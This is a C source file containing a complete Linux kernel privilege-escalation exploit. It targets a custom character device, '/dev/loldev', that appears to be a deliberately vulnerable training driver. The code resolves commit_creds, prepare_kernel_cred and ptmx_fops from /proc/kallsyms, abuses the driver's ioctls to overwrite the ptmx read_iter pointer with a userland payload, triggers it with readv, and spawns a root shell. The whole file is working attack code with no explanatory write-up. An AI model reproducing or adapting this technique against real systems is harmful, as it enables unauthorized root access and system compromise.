#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <inttypes.h>
#include <sys/uio.h>
#include "lol.h"

/*
 * Function prototypes:
 * int commit_creds(struct cred *new)
 * struct cred *prepare_kernel_cred(struct task_struct *daemon)
 */
typedef int __attribute__((regparm(3))) (*_commit)(void *new);
typedef void *__attribute__((regparm(3))) (*_prepare)(void *daemon);

static uint32_t *ptmx_ptr;
static void *commit_ptr;
static void *prepare_ptr;

static ssize_t get_root(void)
{
	_commit commit_creds = (_commit)commit_ptr;
	_prepare prepare_kernel_cred = (_prepare)prepare_ptr;

	commit_creds(prepare_kernel_cred(0));

	*ptmx_ptr = 0;

	return 0;
}

static inline void *find_kernel_symbol(FILE *fp, const char *sym)
{
	char c;
	int ret = 0;
	char name[256] = { 0 };

	void *addr;

	for (;;) {
		ret = fscanf(fp, "%p %c %s\n", &addr, &c, name);

		if (!strcmp(name, sym))
			break;

		if (ret != 3)
			return NULL;
	}

	printf("[+] %s: %p\n", name, addr);

	return addr;
}

int main(void)
{
	FILE *fp;
	void *ptmx;
	int fd, pfd;
	ssize_t ret;
	pid_t pids[] = { 1337, 42, 69, 0 };
	struct lol_alloc l = { .size = 1337 };

	fp = fopen("/proc/kallsyms", "r");
	if (!fp) {
		perror("fopen()");
		exit(EXIT_FAILURE);
	}

	commit_ptr = find_kernel_symbol(fp, "commit_creds");
	prepare_ptr = find_kernel_symbol(fp, "prepare_kernel_cred");
	ptmx = find_kernel_symbol(fp, "ptmx_fops");
	ptmx_ptr = (uint32_t *)((char *)ptmx + sizeof(void *) * 4);

	fclose(fp);

	if (!commit_ptr || !prepare_ptr || !ptmx) {
		fprintf(stderr, "[-] couldn't find symbols :(\n");
		goto fail;
	}

	pfd = open("/dev/ptmx", O_RDONLY);
	if (pfd == -1) {
		perror("open(/dev/ptmx)");
		goto fail;
	}
	
	fd = open("/dev/loldev", O_RDWR);
	if (fd == -1) {
		perror("open(/dev/loldev)");
		close(pfd);
		goto fail;
	}

	if (ioctl(fd, LOL_ALLOC, &l)) {
		perror("ioctl(LOL_ALLOC)");
		goto fail_close;
	}

	/*
	 * struct file_operations {
	 *	struct module *owner;
	 *	loff_t (*llseek) (struct file *, loff_t, int);
	 *	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	 *	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	 *	ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);
	 *	ssize_t (*write_iter) (struct kiocb *, struct iov_iter *)
	 *	[...]
	 * };
	 *
	 * We're overwriting read_iter, which will trigger when we call readv.
	 */
	pids[3] = (pid_t)ptmx_ptr;

	for (int i = 0; i < 4; i++) {
		if (ioctl(fd, LOL_ADD_USER, &pids[i])) {
			perror("ioctl(LOL_ADD_USER)");
			goto fail_close;
		}
	}

	/* overwrite pointer with payload */
	void *tmp = get_root;
	ret = write(fd, &tmp, sizeof(void *));
	if (ret == -1) {
		perror("write()");
		goto fail_close;
	}

	/* trigger payload with readv */
	struct iovec iov;
	iov.iov_base = &iov;
	iov.iov_len = 1;
	ret = readv(pfd, &iov, 1);
	if (ret == -1) {
		perror("readv()");
		goto fail_close;
	}

	if (getuid()) {
		printf("[-] failed to elevate privileges :(\n");
		goto fail_close;
	}

	printf("[+] got root <3\n");
	execl("/bin/sh", "sh", NULL);

	close(fd);
	return 0;

fail_close:
	close(pfd);
	close(fd);
fail:
	exit(EXIT_FAILURE);
}
